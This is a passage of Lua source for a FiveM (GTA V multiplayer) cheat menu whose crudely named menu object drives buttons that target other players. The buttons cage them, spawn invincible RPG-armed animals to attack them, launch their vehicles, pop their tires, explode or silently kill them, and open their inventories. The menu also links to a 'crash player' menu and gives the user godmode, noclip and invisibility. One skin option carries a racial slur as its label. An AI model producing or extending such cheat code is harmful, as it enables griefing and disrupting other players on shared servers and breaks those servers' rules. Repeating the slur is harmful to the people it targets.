                    CreateObject(GetHashKey('lguard'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('lguard'), 5, 0)
                    CreateObject(GetHashKey('pbus'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('pbus'), 6, 0)
                    CreateObject(GetHashKey('police'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('police'), 7, 0)
                    CreateObject(GetHashKey('police2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('police2'), 8, 0)
                    CreateObject(GetHashKey('police3'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('police3'), 1, 0)
                    CreateObject(GetHashKey('police4'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('police4'), 1, 0)
                    CreateObject(GetHashKey('policeb'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('policeb'), 11, 0)
                    CreateObject(GetHashKey('polmav'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('polmav'), 12, 0)
                    CreateObject(GetHashKey('policeold1'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('policeold1'), 13, 0)
                    CreateObject(GetHashKey('policeold2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('policeold2'), 14, 0)
                    CreateObject(GetHashKey('policet'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('policet'), 15, 0)
                    CreateObject(GetHashKey('pranger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('pranger'), 16, 0)
                    CreateObject(GetHashKey('predator'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('predator'), 17, 0)
                    CreateObject(GetHashKey('riot'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('riot'), 18, 0)
                    CreateObject(GetHashKey('sheriff'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('sheriff'), 19, 0)
                    CreateObject(GetHashKey('sheriff2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('sheriff2'), 20, 0)
                    SetPickupRegenerationTime(pickup, 60)
			 elseif IhadSexWithMyStepMother.Button('~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
			elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Dolphins  with ~y~RPG") then
                    local bQ = "a_c_dolphin"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Naked Peds with ~y~RPG") then
                    local bQ = "a_m_m_acult_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
			elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Small ~y~Monkeys") then
                    local bQ = "a_c_rhesus"
					local bR = "weapon_rpg"
					for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
							NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
								SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
						end
                    end
                elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Boar  ~y~With Rpg") then
                    local bQ = "a_c_boar"
					local bR = "weapon_rpg"
					for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
							NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
								SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
						end
                    end
                elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Rat  ") then
                    local bQ = "a_c_rat"
					for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
							NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
								SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
						end
                    end
                elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Whale  ~y~Holding Rpg") then
                    local bQ = "a_c_humpback"
					local bR = "weapon_rpg"
					for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
							NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
								SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
						end
                    end
			elseif IhadSexWithMyStepMother.Button("Nearby Peds Attack Player") then
                PedAttack(selectedPlayer, PedAttackType)
            elseif IhadSexWithMyStepMother.ComboBox("Ped Attack Type", PedAttackOps, currAttackTypeIndex, selAttackTypeIndex, function(currentIndex, selectedIndex)
                currAttackTypeIndex = currentIndex
                selAttackTypeIndex = currentIndex
                PedAttackType = currentIndex
            end) then
			 elseif IhadSexWithMyStepMother.Button("Possess Player Vehicle") then
                if Spectating then SpectatePlayer(selectedPlayer) end
                PossessVehicle(selectedPlayer)
			elseif IhadSexWithMyStepMother.CheckBox("Track Player", Tracking, "Tracking: Nobody", "Tracking: "..GetPlayerName(TrackedPlayer)) then
                Tracking = not Tracking
                TrackedPlayer = selectedPlayer
			elseif IhadSexWithMyStepMother.CheckBox("Fling Player", FlingingPlayer, "Flinging: Nobody", "Flinging: "..GetPlayerName(FlingedPlayer)) then
				FlingingPlayer = not FlingingPlayer
				FlingedPlayer = selectedPlayer
			elseif IhadSexWithMyStepMother.Button("Launch Players Vehicle") then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~Player Not In Vehicle!")		
				else
				
					local wasSpeccing= false
					local tmp = nil
					if Spectating then
						tmp = SpectatedPlayer
						wasSpeccing = true
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
					RequestControlOnce(veh)
					ApplyForceToEntity(veh, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					
					if wasSpeccing then
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
				end
			elseif IhadSexWithMyStepMother.Button("Slam Players Vehicle") then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~Player Not In Vehicle!")
				else
				
					local wasSpeccing= false
					local tmp = nil
					if Spectating then
						tmp = SpectatedPlayer
						wasSpeccing = true
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
					RequestControlOnce(veh)
					ApplyForceToEntity(veh, 3, 0.0, 0.0, -5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					
					if wasSpeccing then
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
				end
			elseif IhadSexWithMyStepMother.ComboBox("Pop Players Vehicle Tire", {"Front Left", "Front Right", "Back Left", "Back Right", "All"}, currTireIndex, selTireIndex, function(currentIndex, selClothingIndex)
                    currTireIndex = currentIndex
                    selTireIndex = currentIndex
                    end) then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						ShowInfo("~r~Player Not In Vehicle!")
					else
					
						local wasSpeccing= false
						local tmp = nil
						if Spectating then
							tmp = SpectatedPlayer
							wasSpeccing = true
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end
					
						local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
						RequestControlOnce(veh)
						if selTireIndex == 1 then
							SetVehicleTyreBurst(veh, 0, 1, 1000.0)
						elseif selTireIndex == 2 then
							SetVehicleTyreBurst(veh, 1, 1, 1000.0)
						elseif selTireIndex == 3 then
							SetVehicleTyreBurst(veh, 4, 1, 1000.0)
						elseif selTireIndex == 4 then
							SetVehicleTyreBurst(veh, 5, 1, 1000.0)
						elseif selTireIndex == 5 then
							for i=0,7 do
								SetVehicleTyreBurst(veh, i, 1, 1000.0)
							end
						end
						
						if wasSpeccing then
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end
					
					end
            elseif IhadSexWithMyStepMother.Button("Explode Player") then
                ExplodePlayer(selectedPlayer)
			elseif IhadSexWithMyStepMother.Button("Silent Kill Player") then
				local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                AddExplosion(coords.x, coords.y, coords.z, 4, 0.1, 0, 1, 0.0)
				end
				
				elseif IhadSexWithMyStepMother.IsMenuOpened("weaponspawnerplayer") then
                for i = 1, #allweapons do
                    if IhadSexWithMyStepMother.Button(allweapons[i]) then
                        GiveWeaponToPed(GetPlayerPed(selectedPlayer), GetHashKey(allweapons[i]), 250, false, true)
                    end
                end
        
        
        -- SPECIFIC PLAYER OPTIONS
        elseif IhadSexWithMyStepMother.IsMenuOpened('playeroptions') then
            if IhadSexWithMyStepMother.Button("~m~PLAYER: " .. "~g~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" .. GetPlayerName(selectedPlayer)) then
			elseif IhadSexWithMyStepMother.CheckBox("~g~Spectate ~s~Player", Spectating, "Spectating: ~m~OFF", "Spectating: "..GetPlayerName(SpectatedPlayer)) then
				Spectating = not Spectating
				SpectatePlayer(selectedPlayer)
				SpectatedPlayer = selectedPlayer
			elseif IhadSexWithMyStepMother.Button("Teleport To Player") then
				local confirm = GetKeyboardInput("Are you Sure? ~g~Y/~r~N")
				if string.lower(confirm) == "y" then
					TeleportToPlayer(selectedPlayer)
				else
					ShowInfo("~r~Operation Canceled")
				end
			elseif IhadSexWithMyStepMother.ComboBox("Teleport Into Players Vehicle~h~~r~ -->", {"Front Right", "Back Left", "Back Right"}, currSeatIndex, selSeatIndex, function(currentIndex, selClothingIndex)
                    currSeatIndex = currentIndex
                    selSeatIndex = currentIndex
                    end) then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						ShowInfo("~r~Player Not In Vehicle!")
					else
						local confirm = GetKeyboardInput("Are you Sure? ~g~Y/~r~N")
						if string.lower(confirm) == "y" then
							local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
							if selSeatIndex == 1 then
								if IsVehicleSeatFree(veh, 0) then
									SetPedIntoVehicle(PlayerPedId(), veh, 0)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							elseif selSeatIndex == 2 then
								if IsVehicleSeatFree(veh, 1) then
									SetPedIntoVehicle(PlayerPedId(), veh, 1)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							elseif selSeatIndex == 3 then
								if IsVehicleSeatFree(veh, 2) then
									SetPedIntoVehicle(PlayerPedId(), veh, 2)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							end
						end
					end	
			elseif IhadSexWithMyStepMother.Button("~r~Kick ~s~From Vehicle") then
                KickFromVeh(selectedPlayer)
			elseif IhadSexWithMyStepMother.Button("~g~Copy ~s~Skin Player ~r~") then
				ClonePed(selectedPlayer)
         ShowInfo("~g~Skin Copied!")				
			elseif IhadSexWithMyStepMother.Button("~g~ESX ~s~Revive ~r~") then
				local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y/~r~N")
			 if string.lower(confirm) == "y" then
			 else
					ShowInfo("~r~Operation Canceled")
				end
			elseif IhadSexWithMyStepMother.Button('~b~VRP ~s~Revive') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    CreateAmbientPickup(GetHashKey('PICKUP_HEALTH_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_HEALTH_STANDARD'), 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
			elseif IhadSexWithMyStepMother.MenuButton("~b~Crash ~s~FiveM Player ~s~Menu", 'crashtroll') then		
			elseif IhadSexWithMyStepMother.MenuButton("Troll ~r~Options", 'troll') then
			elseif IhadSexWithMyStepMother.MenuButton("~Give ~s~Single Weapon", 'weaponspawnerplayer') then
			 elseif IhadSexWithMyStepMother.Button("~b~Give ~s~All Weapons") then
            GiveAllWeapons(selectedPlayer)
            elseif IhadSexWithMyStepMother.Button("~r~Remove ~s~All Weapons") then
                StripPlayer(selectedPlayer)
            elseif IhadSexWithMyStepMother.Button('~b~Full Armour ~s~Player') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(0)
                        CreateAmbientPickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_ARMOUR_STANDARD'), 1, 0)
                        SetPickupRegenerationTime(pickup, 10)
                        i = i + 1
                    end
			elseif IhadSexWithMyStepMother.Button('~r~Kill ~s~Player') then
					AddExplosion(GetEntityCoords(GetPlayerPed(selectedPlayer)), 33, 101.0, false, true, 0.0) 
			elseif IhadSexWithMyStepMother.Button('~r~Spawn 50x Cargoplane To Player') then
			local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(0)
                        CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                        CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
						
                    end
			elseif IhadSexWithMyStepMother.Button("~g~Open ~s~inventory ESX OR CFW") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
            elseif IhadSexWithMyStepMother.Button("Cancel Animation/Task") then
            end
        
        
        
        -- SELF OPTIONS MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('self') then
            if IhadSexWithMyStepMother.MenuButton('PED Options ', 'appearance') then end
            if IhadSexWithMyStepMother.CheckBox("God~s~mode", Godmode) then
                Godmode = not Godmode
                ToggleGodmode(Godmode)
            elseif IhadSexWithMyStepMother.CheckBox("Demigod Mode", Demigod) then
                Demigod = not Demigod
			elseif IhadSexWithMyStepMother.Button("Randomize ~s~Skins") then
                RandomClothes(PlayerId())
			elseif IhadSexWithMyStepMother.Button("Revive", "Native") then
                ReviveKubca()
		    elseif IhadSexWithMyStepMother.ComboBox("~b~Player ~s~Functions -->", {"VRP ~s~Revive", "Give ~s~Player Armor", "Remove ~s~Player Armor", "Clean Player", "Suicide ", "Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
                currPFuncIndex = currentIndex
                selPFuncIndex = currentIndex
                end) then
				if selPFuncIndex == 1 then
					SetEntityHealth(PlayerPedId(), 200)
				elseif selPFuncIndex == 2 then
					SetPedArmour(PlayerPedId(), 100)
				elseif selPFuncIndex == 3 then
					SetPedArmour(PlayerPedId(), 0)
				elseif selPFuncIndex == 4 then
					ClearPedBloodDamage(PlayerPedId())
					ClearPedWetness(PlayerPedId())
					ClearPedEnvDirt(PlayerPedId())
					ResetPedVisibleDamage(PlayerPedId())
				elseif selPFuncIndex == 5 then
					SetEntityHealth(PlayerPedId(), 0)
				elseif selPFuncIndex == 6 then
					ClearPedTasksImmediately(PlayerPedId())
				end
			elseif IhadSexWithMyStepMother.CheckBox("Infinite Stamina", InfStamina) then
				InfStamina = not InfStamina
            elseif IhadSexWithMyStepMother.CheckBox("Alternative Demigod Mode", ADemigod) then
                ADemigod = not ADemigod
            elseif IhadSexWithMyStepMother.CheckBox("Infinite Stamina", InfStamina) then
                InfStamina = not InfStamina
            elseif IhadSexWithMyStepMother.ComboBoxSlider("Fast Run", FastCBWords, currFastRunIndex, selFastRunIndex, function(currentIndex, selClothingIndex)
                currFastRunIndex = currentIndex
                selFastRunIndex = currentIndex
                FastRunMultiplier = FastCB[currentIndex]
                SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
                end) then
			elseif IhadSexWithMyStepMother.ComboBoxSlider("Fast Swim", FastCBWords, currFastSwimIndex, selFastSwimIndex, function(currentIndex, selClothingIndex)
                currFastSwimIndex = currentIndex
                selFastSwimIndex = currentIndex
                FastSwimMultiplier = FastCB[currentIndex]
                SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
                end) then
            elseif IhadSexWithMyStepMother.CheckBox("Super Jump", SuperJump) then
                SuperJump = not SuperJump
            elseif IhadSexWithMyStepMother.CheckBox("Invisibility", Invisibility) then
                Invisibility = not Invisibility
                if not Invisibility then
                    SetEntityVisible(PlayerPedId(), true)
                end
            elseif IhadSexWithMyStepMother.CheckBox("Magneto Mode ~s~KEY ~f~[E]", ForceTog) then
                ForceMod()
            elseif IhadSexWithMyStepMother.CheckBox("Forcefield", Forcefield) then
                Forcefield = not Forcefield
			elseif IhadSexWithMyStepMother.ComboBox("Forcefield Radius -->", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
                    currForcefieldRadiusIndex = currentIndex
                    selForcefieldRadiusIndex = currentIndex
                    ForcefieldRadius = ForcefieldRadiusOps[currentIndex]
                    end) then
            elseif IhadSexWithMyStepMother.CheckBox("Noclip", Noclipping) then
                ToggleNoclip()
			elseif IhadSexWithMyStepMother.ComboBox("Noclip Speed -->", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex)
                    currNoclipSpeedIndex = currentIndex
                    selNoclipSpeedIndex = currentIndex
                    NoclipSpeed = NoclipSpeedOps[currNoclipSpeedIndex]
                    end) then
            end
        
        
        -- APPEARANCE MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('appearance') then
		if IhadSexWithMyStepMother.MenuButton("Models", 'skinsmodels') then
            elseif IhadSexWithMyStepMother.Button("Set Model Name") then
                local model = GetKeyboardInput("Enter Model Name:")
                RequestModel(GetHashKey(model))
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                else ShowInfo("~r~Model not recognized (Try Again)") end
            elseif IhadSexWithMyStepMother.MenuButton("Modify Skin Textures", 'modifyskintextures') then
            elseif IhadSexWithMyStepMother.ComboBox("Save Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
                Outfits[selClothingIndex] = GetCurrentOutfit(PlayerId())
            elseif IhadSexWithMyStepMother.ComboBox("Load Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
                SetCurrentOutfit(Outfits[selClothingIndex])
            end

           
            elseif IhadSexWithMyStepMother.IsMenuOpened('modifyskintextures') then
               
				
			

                if IhadSexWithMyStepMother.MenuButton("Head", "modifyhead") then
				
					if GetEntityModel(PlayerPedId()) ~= GetHashKey("mp_m_freemode_01") then
						IhadSexWithMyStepMother.CloseMenu()
						IhadSexWithMyStepMother.OpenMenu('modifyskintextures') 
						ShowInfo("~r~Only MP Models Supported For Now!") 
                    end
                    
					faceItemsList = GetHeadItems()
                    faceTexturesList = GetHeadTextures(GetPedDrawableVariation(PlayerPedId(), 0))
                    hairItemsList = GetHairItems()
                    hairTexturesList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))
					maskItemsList = GetMaskItems()
					hatItemsList = GetHatItems()
                    hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0))
				end
				
				elseif IhadSexWithMyStepMother.IsMenuOpened('skinsmodels') then
		
if IhadSexWithMyStepMother.Button("~g~Reset Model To FiveM Player") then
			local model = "mp_m_freemode_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
 
	elseif IhadSexWithMyStepMother.Button("Change To ~p~Naked") then
			local model = "a_m_m_acult_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif IhadSexWithMyStepMother.Button("Change To ~p~Nigga") then
                    local model = "csb_grove_str_dlr"
                        RequestModel(GetHashKey(model)) 
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
			elseif IhadSexWithMyStepMother.Button("Change To ~r~Prison") then
			local model = "s_m_y_prismuscl_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif IhadSexWithMyStepMother.Button("Change To ~b~Kuwaiti") then
			local model = "a_m_m_afriamer_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif IhadSexWithMyStepMother.Button("Change To ~o~hotie") then
			local model = "a_f_m_beach_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif IhadSexWithMyStepMother.Button("Change To ~g~Dog") then
			local model = "a_c_poodle"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif IhadSexWithMyStepMother.Button("Change To ~p~Bird") then
			local model = "a_c_seagull"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif IhadSexWithMyStepMother.Button("Change To ~o~ LOL") then
			local model = "a_c_cormorant"
